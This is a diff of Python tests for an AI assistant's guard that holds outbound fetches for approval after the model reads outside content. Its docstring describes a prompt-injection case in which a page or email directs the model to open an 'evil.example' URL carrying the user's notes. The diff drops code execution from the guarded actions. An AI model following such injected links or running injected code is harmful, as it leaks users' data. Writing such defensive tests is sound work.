@@ -1,11 +1,10 @@
 """Outbound calls after outside content wait for a yes (security review H2).
 
 A page, an email or a shared file can tell the model to open
-``https://evil.example/?d=<your notes>`` or to run code over your files. On
-a turn that had already read outside content, ``fetch_url`` to an address
-you didn't give (or this turn's search didn't find) and ``code_interpreter``
-are held on the same approval card as writes. Sub-agents and headless runs
-refuse instead, like held writes there.
+``https://evil.example/?d=<your notes>``. On a turn that had already read
+outside content, ``fetch_url`` to an address you didn't give (or this turn's
+search didn't find) is held on the same approval card as writes. Sub-agents
+and headless runs refuse instead, like held writes there.
 """
 from __future__ import annotations
 
@@ -53,7 +52,6 @@ def test_a_trusted_turn_opens_anything():
     turn = TurnState(untrusted=False, own_attachments_only=False)
     start_step(turn, ["fetch_url"])
     guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)
-    guard_outbound(_ctx(turn), "running code")
 
 
 def test_a_fetch_isnt_held_by_a_page_read_in_the_same_step():
@@ -75,35 +73,21 @@ def test_after_outside_content_only_given_or_found_addresses_open():
         guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)
 
 
-def test_code_runs_freely_on_your_own_attachments_and_its_own_output():
+def test_your_own_attachments_still_hold_an_address_nobody_gave():
     turn = TurnState(untrusted=False, own_attachments_only=False)
 
     class _File:
         user_id = "me"
 
     turn.saw_files([_File()], user_id="me", in_workspace=False)
-    start_step(turn, ["code_interpreter"])
-    guard_outbound(_ctx(turn), "running code")
-    start_step(turn, ["code_interpreter"])  # "fix the error and run it again"
-    guard_outbound(_ctx(turn), "running code")
-    # ...but the code's output can carry a shared file's words: opening an
-    # address nobody gave still waits.
+    start_step(turn, ["fetch_url"])
     with pytest.raises(HoldForApproval):
         guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)
-
-
-def test_code_waits_after_outside_content():
-    turn = TurnState(untrusted=False, own_attachments_only=False)
-    start_step(turn, ["read_room"])
-    start_step(turn, ["code_interpreter"])
-    with pytest.raises(HoldForApproval):
-        guard_outbound(_ctx(turn), "running code")
 
 
 def test_a_yes_runs_it():
     turn = TurnState(user_approved=True, untrusted=True)
     guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)
-    guard_outbound(_ctx(turn), "running code")
 
 
 def test_a_headless_turn_without_steps_uses_what_it_has_seen():
@@ -113,11 +97,9 @@ def test_a_headless_turn_without_steps_uses_what_it_has_seen():
 
 
 def test_the_card_names_the_site():
-    assert holds.holdable("fetch_url") and holds.holdable("code_interpreter")
+    assert holds.holdable("fetch_url") and not holds.holdable("code_interpreter")
     q = holds.question("fetch_url", {"url": EVIL})
     assert q.startswith("Promptly wants to open evil.example") and EVIL in q
-    q = holds.question("code_interpreter", {"code": "import os\nprint(os.listdir())"})
-    assert "run this Python code" in q and "os.listdir" in q
 
 
 async def test_the_fetch_tool_itself_holds(monkeypatch):
